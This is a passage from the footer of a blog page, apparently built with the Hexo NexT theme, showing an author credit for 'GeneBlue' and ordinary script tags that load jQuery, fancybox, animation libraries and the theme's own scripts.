    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">GeneBlue</span>
</div>

        












        
      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/muse.js"></script>
<script src="/js/next-boot.js"></script>



  
















  

  

</body>
</html>
